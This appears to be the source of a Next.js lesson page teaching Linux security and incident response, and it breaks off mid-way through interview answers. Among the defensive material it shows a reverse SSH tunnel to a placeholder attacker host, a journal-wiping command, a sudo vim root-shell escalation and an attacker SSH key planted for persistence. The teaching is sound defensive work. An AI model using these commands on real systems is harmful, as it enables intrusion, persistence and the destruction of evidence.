import type { Metadata } from 'next'
import Link from 'next/link'
import { LearnLayout } from '@/components/content/LearnLayout'
import { Callout } from '@/components/content/Callout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'

export const metadata: Metadata = {
  title: 'Linux for Security Engineers | Chaduvuko',
  description: 'File permissions, processes, users, logs, and the commands every security professional uses daily. The OS that runs the internet.',
}

const C = '#ff4757'

const Part = ({ n, title }: { n: string; title: string }) => (
  <div style={{ marginBottom: 28 }}>
    <p style={{ fontSize: 11, color: C, fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 8px', letterSpacing: '.1em' }}>// Part {n}</p>
    <h2 style={{ fontFamily: 'var(--font-display)', fontSize: 'clamp(20px,3vw,30px)', fontWeight: 900, letterSpacing: '-1.5px', color: 'var(--text)', margin: 0 }}>{title}</h2>
  </div>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.9, margin: '0 0 18px' }}>{children}</p>
)

const H = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontSize: 17, fontWeight: 700, color: 'var(--text)', margin: '32px 0 12px' }}>{children}</h3>
)

const Hl = ({ children }: { children: React.ReactNode }) => (
  <strong style={{ color: C }}>{children}</strong>
)

const HR = () => <div style={{ borderTop: '1px solid var(--border)', margin: '48px 0' }} />

const IQ = ({ q, children }: { q: string; children: React.ReactNode }) => (
  <div style={{ marginBottom: 40 }}>
    <div style={{ background: `${C}10`, border: `1px solid ${C}25`, borderRadius: '8px 8px 0 0', padding: '14px 18px', fontSize: 14, fontWeight: 700, color: 'var(--text)' }}>Q: {q}</div>
    <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderTop: 'none', borderRadius: '0 0 8px 8px', padding: '18px', fontSize: 14, color: 'var(--text)', lineHeight: 1.9 }}>{children}</div>
  </div>
)

const Err = ({ msg, cause, fix }: { msg: string; cause: string; fix: string }) => (
  <div style={{ marginBottom: 24, border: '1px solid var(--border)', borderRadius: 10, overflow: 'hidden' }}>
    <div style={{ background: 'rgba(255,71,87,0.09)', borderBottom: '1px solid var(--border)', padding: '10px 16px', fontFamily: 'var(--font-mono)', fontSize: 12, color: '#ff4757', wordBreak: 'break-all', lineHeight: 1.6 }}>{msg}</div>
    <div style={{ padding: '14px 16px' }}>
      <p style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7, margin: '0 0 8px' }}><strong style={{ color: 'var(--text)' }}>Cause: </strong>{cause}</p>
      <p style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7, margin: 0 }}><strong style={{ color: '#00e676' }}>Fix: </strong>{fix}</p>
    </div>
  </div>
)

const ProTip = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: `${C}08`, border: `1px solid ${C}20`, borderRadius: 10, padding: '16px 20px', margin: '24px 0' }}>
    <p style={{ fontSize: 11, fontWeight: 700, color: C, fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '.1em', margin: '0 0 8px' }}>🎯 Pro Tip</p>
    <p style={{ fontSize: 14, color: 'var(--text)', lineHeight: 1.85, margin: 0 }}>{children}</p>
  </div>
)

const Block = ({ children }: { children: React.ReactNode }) => (
  <pre style={{ fontFamily: 'var(--font-mono)', fontSize: 12, background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 8, padding: '16px 20px', overflowX: 'auto', lineHeight: 1.75, color: 'var(--text)', margin: '0 0 20px' }}>{children}</pre>
)

const Code = ({ children }: { children: React.ReactNode }) => (
  <code style={{ fontFamily: 'var(--font-mono)', fontSize: 12, background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 4, padding: '1px 6px', color: 'var(--text)' }}>{children}</code>
)

export default function LinuxForSecurity() {
  return (
    <LearnLayout
      title="Linux for Security Engineers"
      description="File permissions, processes, users, logs, and the commands every security professional uses daily. The OS that runs the internet."
      section="Cybersecurity — Module 03"
      readTime="30 min"
      updatedAt="May 2026"
    >

      {/* ── PART 01 ── */}
      <Part n="01" title="Why Linux Is the Security Engineer's Operating System" />

      <P>Approximately 96% of the world's top 1 million web servers run Linux. Every major cloud provider's default compute instance is Linux. Docker containers run a Linux kernel. Most network appliances — firewalls, routers, load balancers — run Linux or a Linux-derived OS. If you are attacking or defending internet infrastructure, you are working with Linux.</P>

      <P>Security tools — nmap, Wireshark, Metasploit, Burp Suite, most SIEM agents, most EDR agents — are built primarily for Linux. The command line is not an anachronism. It is the control plane for production systems. A security engineer who cannot navigate a Linux terminal comfortably is limited to tools that provide a GUI, which excludes most professional security work.</P>

      <div style={{ background: `${C}08`, border: `1px solid ${C}25`, borderLeft: `4px solid ${C}`, borderRadius: '0 10px 10px 0', padding: '20px 24px', margin: '4px 0 24px' }}>
        <P>This module focuses on Linux specifically from the security perspective — not general Linux administration. You will learn the concepts and commands that appear on real incident response engagements, penetration tests, and security configurations. Each section explains both how attackers exploit Linux and how defenders use it to detect and respond.</P>
      </div>

      <HR />

      {/* ── PART 02 ── */}
      <Part n="02" title="The Filesystem — Structure and Security Implications" />

      <P>Linux organises everything in a single hierarchical filesystem starting at <Code>/</Code> (root). Understanding the filesystem layout is critical for security because each directory has a specific role, and deviations from expected content are indicators of compromise.</P>

      <div style={{ display: 'grid', gap: 10, margin: '0 0 28px' }}>
        {[
          { path: '/etc', color: '#ff4757', desc: 'System-wide configuration files. SSH keys, user databases, cron jobs, network configuration.', security: 'Attackers target /etc/passwd, /etc/shadow (password hashes), /etc/crontab (persistence), /etc/sudoers (privilege escalation). Monitor for unexpected changes.' },
          { path: '/var/log', color: '#4285f4', desc: 'System and application log files. Authentication logs, system logs, application logs.', security: 'Primary source of forensic evidence. Attackers often clear or truncate logs to cover tracks. Centralise logs to a remote SIEM so local log deletion does not destroy evidence.' },
          { path: '/tmp and /var/tmp', color: '#f97316', desc: 'Temporary files. /tmp is cleared on reboot; /var/tmp persists.', security: 'Attackers often write malware and stage exploits here because all users can write to it. Unusual executables in /tmp are a strong indicator of compromise. Mount /tmp noexec to prevent execution.' },
          { path: '/home', color: '#00e676', desc: 'User home directories. Each user has their own directory.', security: 'Contains .ssh/authorized_keys (attackers add persistence here), .bash_history (command history), and browser data. Monitor for SSH key additions and unusual file creation.' },
          { path: '/root', color: '#7b61ff', desc: 'Home directory for the root user (superuser).', security: 'If an attacker achieves root, /root is their workspace. .bash_history here shows root-level commands executed during a compromise.' },
          { path: '/proc and /sys', color: 'var(--muted)', desc: 'Virtual filesystems presenting kernel and process information in file format.', security: '/proc/[pid]/exe shows the binary a process is running. /proc/[pid]/fd shows open file descriptors. Attackers may delete their binary on disk but the running process can still be inspected via /proc.' },
          { path: '/usr/local/bin and /opt', color: '#facc15', desc: 'User-installed software. Not managed by the system package manager.', security: 'Attackers place persistence mechanisms here. Any unexpected binary in these locations warrants investigation. Compare against a known-good baseline.' },
        ].map((item) => (
          <div key={item.path} style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderLeft: `3px solid ${item.color}`, borderRadius: 8, padding: '12px 16px' }}>
            <div style={{ fontSize: 13, fontWeight: 900, color: item.color, fontFamily: 'var(--font-mono)', marginBottom: 4 }}>{item.path}</div>
            <div style={{ fontSize: 13, color: 'var(--text)', lineHeight: 1.65, marginBottom: 6 }}>{item.desc}</div>
            <div style={{ fontSize: 11, color: 'var(--muted)', lineHeight: 1.5 }}>🔒 {item.security}</div>
          </div>
        ))}
      </div>

      <HR />

      {/* ── PART 03 ── */}
      <Part n="03" title="File Permissions — The Access Control System" />

      <P>Linux uses a discretionary access control system based on three permission types (read, write, execute) for three identity categories (owner, group, others). Every file and directory has a permission mask that determines who can do what.</P>

      <Block>{`$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1234 May 09 2026 /etc/shadow
│││││││││
│││││││└── others: --- (no permissions)
│││││││
│││││└─── group (shadow): r-- (read only)
│││││
│││└───── owner (root): rw- (read and write)
│││
│└─────── type: - = regular file, d = directory, l = symlink
│
└──────── first character (file type)`}</Block>

      <H>Reading Permission Notation</H>
      <P>Each permission set uses three characters: <Code>r</Code> (read), <Code>w</Code> (write), <Code>x</Code> (execute), <Code>-</Code> (not set). In numeric (octal) notation: r=4, w=2, x=1. Add them for each category.</P>

      <Block>{`Permission  Symbolic  Numeric  Meaning
rwxrwxrwx   777      Owner, group, and others can read, write, execute
rwxr-xr-x   755      Owner can write; group and others can only read/execute
rw-r--r--   644      Owner can write; group and others can only read
rw-------   600      Only owner can read and write — private key files
r--------   400      Read only by owner — maximum restriction

chmod 755 script.sh    # Set permissions numerically
chmod +x script.sh     # Add execute permission for everyone
chmod go-w file.txt    # Remove write from group and others`}</Block>

      <H>SUID, SGID, and Sticky Bit — Privilege Escalation Vectors</H>
      <P>Three special permission bits exist beyond the basic rwx model, and all three are privilege escalation vectors when misconfigured:</P>

      <P><Hl>SUID (Set User ID, bit 4000):</Hl> When set on an executable, the program runs with the file owner's permissions, not the calling user's. <Code>/usr/bin/passwd</Code> is SUID root — a normal user can run it and it can modify <Code>/etc/shadow</Code> (which only root can normally write). If an attacker finds a SUID binary with a vulnerability, they can escalate to the file owner's privileges.</P>

      <Block>{`# Find all SUID binaries — attackers run this during privilege escalation
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec          ← PwnKit vulnerability (CVE-2021-4034) — SUID pkexec → root
/usr/local/bin/custom    ← Non-standard SUID binary — investigate immediately`}</Block>

      <P><Hl>Sticky Bit (bit 1000):</Hl> On a directory, prevents users from deleting or renaming files owned by other users. <Code>/tmp</Code> has the sticky bit set — all users can create files there, but only the file owner and root can delete them. Missing sticky bit on shared directories allows any user to delete others' files.</P>

      <P><Hl>SGID (Set Group ID, bit 2000):</Hl> On executables, runs with the file's group permissions. On directories, new files created inherit the directory's group rather than the creating user's primary group — useful for shared project directories.</P>

      <H>File Ownership</H>
      <Block>{`$ chown root:root sensitive_file.txt    # Set owner and group to root
$ chown www-data:www-data webroot/       # Web server user owns web files
$ chgrp developers project_dir/         # Change group ownership only

# The /etc/passwd file structure — user database (no actual passwords)
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user1:x:1001:1001:John Doe:/home/user1:/bin/bash
# username:password(x=shadow):UID:GID:GECOS:home:shell
# UID 0 = root regardless of username`}</Block>

      <ProTip>During a penetration test, the first post-exploitation steps always include: finding SUID binaries (find / -perm -4000), finding world-writable directories (find / -perm -002), and checking sudo permissions (sudo -l). GTFOBins.github.io documents how common SUID binaries can be abused for privilege escalation — it is both an attacker reference and a defender's checklist for what to audit.</ProTip>

      <HR />

      {/* ── PART 04 ── */}
      <Part n="04" title="Users, Groups, and Privileges" />

      <H>The Root User</H>
      <P>Root (UID 0) is the superuser — there are no permission restrictions. Root can read any file, write any file, kill any process, and modify any configuration. Most production systems run services as non-root users specifically to limit the damage if the service is compromised. A compromised <Code>www-data</Code> process can only access files that <Code>www-data</Code> can access; a compromised root process can access everything.</P>

      <H>sudo — Delegated Privilege</H>
      <P><Code>sudo</Code> (superuser do) allows specific users or groups to run specific commands as root, controlled by <Code>/etc/sudoers</Code>. Properly configured sudo is safer than sharing the root password because it is granular and logged.</P>

      <Block>{`# /etc/sudoers — NEVER edit directly, use visudo
# Grant user john ability to restart nginx as root
john ALL=(ALL) /bin/systemctl restart nginx

# Grant group devops ability to run any command as root (dangerous — effectively root)
%devops ALL=(ALL) NOPASSWD: ALL

# Check your own sudo permissions
$ sudo -l
User john may run the following commands on server1:
    (ALL) /bin/systemctl restart nginx
    (ALL) /usr/bin/vim /etc/nginx/nginx.conf   ← DANGEROUS: vim can spawn a shell`}</Block>

      <P>The last line is a classic privilege escalation: if sudo allows running <Code>vim</Code> as root on a specific file, an attacker runs <Code>sudo vim /etc/nginx/nginx.conf</Code> and types <Code>:!/bin/bash</Code> inside vim — getting a root shell. The GTFOBins project documents this pattern for dozens of common tools including vim, less, awk, python, perl, and many others.</P>

      <H>/etc/passwd and /etc/shadow</H>
      <Block>{`# /etc/shadow — actual password hashes (root-readable only)
root:$6$rounds=656000$salt$hashedpassword:18945:0:99999:7:::
john:$6$rounds=656000$differenthash:18990:0:99999:7:::
# Format: username:hash:lastchange:min:max:warn:inactive:expire:

# Hash algorithm identifiers
$1$ = MD5        (broken — trivially crackable)
$2y$ = bcrypt    (strong)
$5$ = SHA-256    (acceptable)
$6$ = SHA-512    (strong, default on modern Linux)
$y$ = yescrypt   (strongest, modern distributions)`}</Block>

      <P>If an attacker obtains <Code>/etc/shadow</Code> (requires root or shadow group membership), they can attempt offline password cracking with hashcat or John the Ripper. SHA-512 with a high round count is slow to crack — a strong password with these settings resists offline attacks for years. MD5 password hashes crack in seconds with modern GPUs.</P>

      <H>Service Accounts</H>
      <P>Services like web servers (<Code>www-data</Code>), databases (<Code>mysql</Code>), and mail servers (<Code>postfix</Code>) run as dedicated non-root users with login disabled (<Code>/usr/sbin/nologin</Code> as the shell). This is the principle of least privilege applied at the OS level. Compromising the web server process gives an attacker <Code>www-data</Code> permissions, not root. Proper service account configuration means: no shell, no home directory write access, no sudo, no group memberships beyond what the service requires.</P>

      <HR />

      {/* ── PART 05 ── */}
      <Part n="05" title="Processes — What Is Running and Why It Matters" />

      <H>Process Management</H>
      <Block>{`# See all running processes with full details
$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root         1  0.0  0.1  22548  9800 ?    Ss   08:00   0:01 /sbin/init
www-data  4521  0.1  2.3 450000 94000 ?   S    09:15   0:08 nginx: worker process
root      4999  0.0  0.0  4500  1200 pts/0 S+   09:20   0:00 /tmp/suspicious  ← investigate

# Real-time process monitoring
$ top
$ htop     # Better interactive version

# Process tree — shows parent-child relationships
$ pstree -p | grep suspicious
nginx(4520)─┬─nginx(4521)
            └─suspicious(4999)   ← nginx spawned a suspicious child process`}</Block>

      <H>What Attackers Do With Processes</H>
      <P><Hl>Process injection:</Hl> Attackers inject malicious code into legitimate processes to hide their activity. A malware module running inside a trusted <Code>sshd</Code> or <Code>apache2</Code> process appears as a normal system process in <Code>ps</Code> output. Detection requires memory forensics tools that inspect process memory rather than just the process list.</P>

      <P><Hl>Checking what a running process is actually executing:</Hl></P>

      <Block>{`# A process deleted its binary after starting (classic anti-forensics)
$ ls -la /proc/4999/exe
lrwxrwxrwx 1 root root 0 May 09 13:45 /proc/4999/exe -> /tmp/malware (deleted)
#                                                                        ↑ binary deleted

# But we can still recover it from /proc
$ cp /proc/4999/exe /tmp/recovered_malware

# What files does the process have open?
$ ls -la /proc/4999/fd/
# Check what network connections the process has
$ cat /proc/4999/net/tcp`}</Block>

      <H>Network Connections — What Is Talking to the Internet</H>
      <Block>{`# Show all network connections and which processes own them
$ ss -tulnp                  # modern replacement for netstat
$ netstat -tulnp             # older but still common

Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          sshd
tcp    LISTEN  0       128     0.0.0.0:80           0.0.0.0:*          nginx
tcp    ESTAB   0       0       10.0.0.5:4444        185.234.1.2:51234  bash  ← reverse shell

# The last line: bash has an established connection to an external IP on port 4444
# Port 4444 is a common Metasploit reverse shell port — this machine is compromised`}</Block>

      <H>Cron Jobs — Persistence Mechanism</H>
      <P>Cron runs commands on a schedule. Attackers use cron to maintain persistence — even if their malware process is killed, cron will restart it on the next scheduled run.</P>

      <Block>{`# All cron locations to check during incident response
/etc/crontab              # System-wide cron
/etc/cron.d/              # Drop-in cron files (easy for attackers to hide in)
/etc/cron.daily/          # Scripts run daily
/etc/cron.hourly/         # Scripts run hourly
/var/spool/cron/crontabs/ # Per-user cron jobs
crontab -l                # Current user's cron (run as different users to check all)

# Suspicious crontab entry
* * * * * /tmp/.hidden_script   # Runs every minute, hidden file in /tmp`}</Block>

      <HR />

      {/* ── PART 06 ── */}
      <Part n="06" title="Log Files — The Evidence Trail" />

      <P>Logs are the primary evidence source in incident response. Linux logs everything — authentication attempts, sudo usage, service starts and stops, kernel events. Understanding where logs live and how to read them is not optional for security work.</P>

      <div style={{ display: 'grid', gap: 10, margin: '0 0 28px' }}>
        {[
          { file: '/var/log/auth.log', distro: 'Debian/Ubuntu', desc: 'All authentication events — SSH logins, sudo usage, PAM events, failed login attempts', what: 'Failed SSH brute force attempts, successful logins from unexpected IPs, privilege escalation via sudo' },
          { file: '/var/log/secure', distro: 'RHEL/CentOS', desc: 'Same as auth.log but on Red Hat-based systems', what: 'Same authentication events on enterprise Linux distributions used in most corporate environments' },
          { file: '/var/log/syslog', distro: 'All', desc: 'General system events — service starts/stops, hardware events, kernel messages', what: 'Services starting/stopping unexpectedly, kernel-level security events, malware that logs its own activity' },
          { file: '/var/log/kern.log', distro: 'Debian/Ubuntu', desc: 'Kernel-level events including hardware and security-relevant kernel messages', what: 'Kernel module loading/unloading (rootkit installation), OOM events, driver errors' },
          { file: '/var/log/apache2/access.log', distro: 'Web server', desc: 'Every HTTP request received by Apache — IP, method, URL, response code, user agent', what: 'Directory traversal attempts (../../etc/passwd), SQL injection in URLs, scanner signatures in User-Agent' },
          { file: '/var/log/nginx/error.log', distro: 'Nginx', desc: 'nginx errors — permission denied, upstream failures, configuration problems', what: 'Failed requests revealing application logic, file permission errors indicating misconfiguration' },
          { file: '~/.bash_history', distro: 'All', desc: 'Command history for the user — every command typed in the terminal', what: 'Commands run by an attacker after compromise: reconnaissance commands, privilege escalation attempts, files downloaded' },
        ].map((item) => (
          <div key={item.file} style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 8, padding: '12px 16px' }}>
            <div style={{ display: 'flex', gap: 12, alignItems: 'flex-start', marginBottom: 6 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: C, fontFamily: 'var(--font-mono)', flexShrink: 0 }}>{item.file}</div>
              <div style={{ fontSize: 11, color: 'var(--muted)', background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 4, padding: '1px 6px', flexShrink: 0 }}>{item.distro}</div>
            </div>
            <div style={{ fontSize: 12, color: 'var(--text)', lineHeight: 1.65, marginBottom: 4 }}>{item.desc}</div>
            <div style={{ fontSize: 11, color: 'var(--muted)', lineHeight: 1.5 }}>🔍 Look for: {item.what}</div>
          </div>
        ))}
      </div>

      <H>Reading Logs Effectively</H>
      <Block>{`# Failed SSH login attempts — brute force indicator
$ grep "Failed password" /var/log/auth.log | tail -20
May 09 03:12:01 server sshd[4521]: Failed password for root from 185.234.1.2 port 51234 ssh2
May 09 03:12:02 server sshd[4521]: Failed password for root from 185.234.1.2 port 51235 ssh2
# 800 lines of this = brute force attack in progress

# Successful login after failures — successful brute force
$ grep "Accepted" /var/log/auth.log
May 09 03:47:22 server sshd[4521]: Accepted password for root from 185.234.1.2 port 51890 ssh2
# Only one Accepted after hundreds of Failed = brute force succeeded

# Sudo usage — who ran what as root
$ grep "sudo:" /var/log/auth.log
May 09 10:15:33 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash
#                                                                                    ↑ escalated directly to shell — suspicious`}</Block>

      <H>journald — The Modern Log System</H>
      <Block>{`# Modern systemd systems use journald, queried with journalctl
$ journalctl -u ssh --since "2026-05-09 00:00" --until "2026-05-09 12:00"
$ journalctl -f              # Follow new log entries (like tail -f)
$ journalctl -p err          # Show only error priority and above
$ journalctl _COMM=sudo      # Show all sudo invocations

# journald stores logs in binary format — cannot be edited with a text editor
# Attackers who know this will try to clear the journal entirely
$ journalctl --vacuum-size=1K   # Attackers may try this to destroy logs`}</Block>

      <ProTip>Always centralise logs to a remote SIEM or syslog server before you need them for incident response. If logs only exist on the compromised machine, an attacker who achieves root can delete them. "The attacker cleared the logs" is a common incident finding that leaves defenders blind to the full scope of what happened. Log centralisation is the single most important forensic preparedness step for Linux systems.</ProTip>

      <HR />

      {/* ── PART 07 ── */}
      <Part n="07" title="SSH — The Protocol That Controls Everything" />

      <P>SSH (Secure Shell) is the primary remote administration protocol for Linux. It encrypts all traffic between client and server. Understanding SSH deeply — both how to secure it and how attackers abuse it — is essential for anyone working in security.</P>

      <H>SSH Key Authentication</H>
      <Block>{`# Generate an SSH key pair
$ ssh-keygen -t ed25519 -C "security@company.com"
# Creates two files:
# ~/.ssh/id_ed25519      (PRIVATE KEY — never share, treat like a password)
# ~/.ssh/id_ed25519.pub  (public key — safe to distribute)

# Add public key to a server
$ ssh-copy-id user@server  # copies to ~/.ssh/authorized_keys on server

# The authorized_keys file — each line is a trusted public key
$ cat ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... security@company.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5BBBBB... attacker@evil.com  ← persistence mechanism
#                                                              ↑ attackers add keys here`}</Block>

      <H>SSH Configuration Hardening</H>
      <Block>{`# /etc/ssh/sshd_config — critical security settings
PermitRootLogin no               # Never allow direct root SSH login
PasswordAuthentication no        # Force key-based auth — eliminates brute force
PubkeyAuthentication yes         # Allow key auth
AuthorizedKeysFile .ssh/authorized_keys  # Key file location
MaxAuthTries 3                   # Disconnect after 3 failed attempts
LoginGraceTime 30                # Disconnect if not authenticated in 30s
AllowUsers john maria ops        # Whitelist — only these users can SSH
Port 2222                        # Non-default port (minor — stops automated scanners)
X11Forwarding no                 # Disable X11 forwarding (attack surface)
AllowTcpForwarding no            # Disable port forwarding if not needed`}</Block>

      <H>SSH Tunneling — Legitimate and Abused</H>
      <P>SSH can forward ports — creating encrypted tunnels through which other traffic flows. This is legitimate for accessing internal services and is heavily abused by attackers for pivoting and exfiltration.</P>

      <Block>{`# Local port forwarding — access remote service through SSH tunnel
$ ssh -L 8080:internal-db:3306 jump-host  # Connect to localhost:8080 to reach internal MySQL

# Remote port forwarding — attacker's favourite for exfiltration
$ ssh -R 4444:localhost:22 attacker.com   # Expose victim's port 22 on attacker's server
# Victim runs this → attacker can now SSH into victim from outside

# Dynamic port forwarding — SOCKS proxy through SSH
$ ssh -D 1080 jump-host                   # Everything through 1080 appears to come from jump-host
# Often used to bypass firewall restrictions and route malicious traffic`}</Block>

      <HR />

      {/* ── PART 08 ── */}
      <Part n="08" title="Essential Security Commands — The Daily Toolkit" />

      <H>File Investigation</H>
      <Block>{`# Find recently modified files — useful for finding attacker-created files
$ find / -mtime -1 -type f 2>/dev/null          # Modified in last 24 hours
$ find / -newer /etc/passwd -type f 2>/dev/null  # Modified after /etc/passwd

# Find world-writable files — privilege escalation targets
$ find / -perm -002 -type f 2>/dev/null

# Find SUID binaries — privilege escalation targets
$ find / -perm -4000 -type f 2>/dev/null

# Check file integrity
$ sha256sum /usr/bin/passwd > baseline.txt       # Create baseline
$ sha256sum -c baseline.txt                      # Verify against baseline — changed = tampered

# File type (ignores extension — attackers rename files)
$ file suspicious_binary
suspicious_binary: ELF 64-bit LSB executable, x86-64   # It's an executable regardless of name

# Check for hidden files (start with .)
$ ls -la /tmp/     # -a shows hidden files
$ find / -name ".*" -type f 2>/dev/null`}</Block>

      <H>Network Investigation</H>
      <Block>{`# All listening ports and which process owns each
$ ss -tulnp
$ netstat -tulnp

# All established connections — check for unexpected C2 connections
$ ss -tnp state established
$ netstat -tnp | grep ESTABLISHED

# Resolve IP addresses from suspicious connections
$ whois 185.234.1.2              # Who owns this IP?
$ dig -x 185.234.1.2             # Reverse DNS lookup

# ARP table — who is on the same network segment
$ arp -n

# Firewall rules
$ iptables -L -n -v              # Show all rules
$ ufw status verbose             # If using UFW`}</Block>

      <H>User and Authentication Investigation</H>
      <Block>{`# Who is currently logged in
$ who
$ w           # More detail: what they are running

# Login history — when accounts were used
$ last         # Shows all logins
$ last john    # Logins for specific user
$ lastb        # Failed login attempts (requires read permission)

# Account details
$ id john                       # UID, GID, group memberships
$ groups john                   # Group memberships
$ cat /etc/passwd | grep -v nologin | grep -v false  # Users with real shells

# Check for new accounts (high UIDs)
$ awk -F: '$3 >= 1000 {print $1, $3}' /etc/passwd

# Check sudo configuration
$ cat /etc/sudoers
$ ls /etc/sudoers.d/            # Drop-in sudo rules (attackers add files here)`}</Block>

      <H>Process Investigation</H>
      <Block>{`# Full process list with network state correlation
$ ps auxf                        # Full list in tree format
$ pstree -p                      # Tree with PIDs

# Processes with no associated binary on disk
$ for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    if [ -L /proc/$pid/exe ]; then
      if [[ $(readlink /proc/$pid/exe) == *"(deleted)"* ]]; then
        echo "PID $pid: $(readlink /proc/$pid/exe)"
      fi
    fi
  done

# Environment variables of a running process (may reveal secrets)
$ cat /proc/4999/environ | tr '\0' '\n'

# Loaded kernel modules — rootkits often hide as kernel modules
$ lsmod
$ modinfo <module_name>         # Details about a specific module`}</Block>

      <HR />

      {/* ── PART 09 ── */}
      <Part n="09" title="What This Looks Like at Work — Post-Compromise Linux Investigation" />

      <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 12, padding: '24px 28px', marginBottom: 24 }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: C, background: `${C}15`, border: `1px solid ${C}30`, borderRadius: 6, padding: '4px 10px', fontFamily: 'var(--font-mono)', display: 'inline-block', marginBottom: 20, letterSpacing: '.1em', textTransform: 'uppercase' }}>
          Scenario — An e-commerce server behaving unexpectedly
        </div>

        {[
          {
            time: '14:00',
            label: 'Alert: unexpected outbound connection from web server',
            body: 'The firewall logs show an established TCP connection from web-prod-01 (an nginx server) to 185.234.91.4:443 — a connection that was not initiated by a known service. The server should only accept inbound connections, never initiate outbound ones to unknown IPs.',
          },
          {
            time: '14:08',
            label: 'Initial triage on the server',
            body: 'Running ss -tnp confirms the connection: nginx worker process has an established connection to the external IP. But nginx worker processes do not initiate outbound connections — they accept inbound connections and respond. Something is wrong. ps aux shows a process named "nginx: worker process" whose PID trace through /proc confirms its executable is /tmp/.nw (deleted). A process pretending to be nginx.',
          },
          {
            time: '14:20',
            label: 'Examining how it got there',
            body: 'find / -mtime -7 -type f shows a file /var/log/nginx/.access_log created 6 days ago — an unusual file in the log directory with a name designed to blend in. cat shows it is a compiled ELF binary disguised as a log file. grep "POST" /var/log/nginx/access.log reveals: 6 days ago, a POST request to /upload.php with a response code 200 and a 45-byte body — a PHP webshell was uploaded and executed.',
          },
          {
            time: '14:45',
            label: 'Persistence mechanisms',
            body: 'crontab -l for the www-data user reveals: * * * * * /bin/bash /var/log/nginx/.access_log — the binary is re-executed every minute. Even if killed, it respawns within 60 seconds. cat /root/.ssh/authorized_keys shows a key that was not there last week — a second persistence mechanism. The attacker added their SSH key to root\'s authorized_keys, meaning they also have root access.',
          },
          {
            time: '15:30',
            label: 'Scope determination and containment',
            body: 'last shows the root account logged in via SSH 5 days ago from the attacker IP, after the webshell was used to add the SSH key. Reviewing /root/.bash_history reveals the attacker ran: cat /var/www/html/config.php (stole database credentials), mysqldump --all-databases (dumped all databases), and scp to exfiltrate the dump. The scope includes full database compromise. The server is isolated and an incident is declared.',
          },
        ].map((block) => (
          <div key={block.time} style={{ display: 'flex', gap: 20, marginBottom: 20 }}>
            <div style={{ flexShrink: 0, width: 60, textAlign: 'right' }}>
              <div style={{ fontSize: 12, fontWeight: 700, color: C, fontFamily: 'var(--font-mono)' }}>{block.time}</div>
            </div>
            <div style={{ flex: 1, borderLeft: `2px solid ${C}30`, paddingLeft: 18, paddingBottom: 4 }}>
              <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)', marginBottom: 4 }}>{block.label}</div>
              <div style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.75 }}>{block.body}</div>
            </div>
          </div>
        ))}

        <Callout type="warning">
          This attack chain is typical of web application compromise: upload a webshell via an unpatched file upload vulnerability → execute commands as the web server user → escalate privileges → add SSH key for persistent access → exfiltrate data. The whole chain used only standard Linux commands. Every step left log traces — but only on the compromised server. Centralised logging would have preserved the evidence regardless of whether the attacker deleted local logs.
        </Callout>
      </div>

      <HR />

      {/* ── PART 10 ── */}
      <Part n="10" title="Interview Prep — 5 Questions With Complete Answers" />

      <IQ q="How do Linux file permissions work, and what is the risk of SUID binaries?">
        Linux uses a discretionary access control model where each file and directory has an owner, a group, and a set of permissions for three categories: the owner, the group, and all other users. Each category has three permission bits: read (4), write (2), and execute (1). The numeric representation adds these values for each category — 755 means owner has read/write/execute (7), group has read/execute (5), others have read/execute (5).
        {'\n\n'}
        The SUID (Set User ID) bit changes how execution permissions work. When an executable has SUID set, it runs with the permissions of the file owner rather than the calling user. The passwd binary is SUID root — when a normal user runs passwd to change their password, the process runs with root privileges to write to /etc/shadow, which only root can normally modify. This is intentional and necessary.
        {'\n\n'}
        The security risk: if any SUID root binary has a vulnerability, or if a non-standard SUID binary is created, an attacker can exploit it to execute code as root. Privilege escalation workflows always include finding SUID binaries with find / -perm -4000 -type f. The GTFOBins project documents how many common SUID binaries — vim, less, python, awk, cp — can be exploited to spawn a root shell if they are SUID root.
        {'\n\n'}
        Defenders: audit SUID binaries regularly against a known baseline. Any SUID binary not in the baseline warrants immediate investigation. Avoid granting SUID to custom binaries. Use capabilities (setcap) as a more granular alternative when a binary needs specific elevated privileges rather than full root.
      </IQ>

      <IQ q="Where would you look to investigate a suspected Linux compromise? Walk me through your process.">
        The first goal in any Linux compromise investigation is to preserve evidence before the attacker destroys it, while avoiding actions that modify the system state you are trying to capture.
        {'\n\n'}
        Step one: snapshot running state. Run ps aux to capture all running processes. Run ss -tulnp to capture all network connections. Run who and last to capture current and recent logins. Run netstat or ss to see all established connections. This volatile information disappears on reboot.
        {'\n\n'}
        Step two: check authentication logs. On Debian/Ubuntu: /var/log/auth.log. On RHEL/CentOS: /var/log/secure. Look for failed password attempts (brute force) followed by successful logins, sudo usage to unexpected commands, and logins from unexpected IPs or at unexpected times.
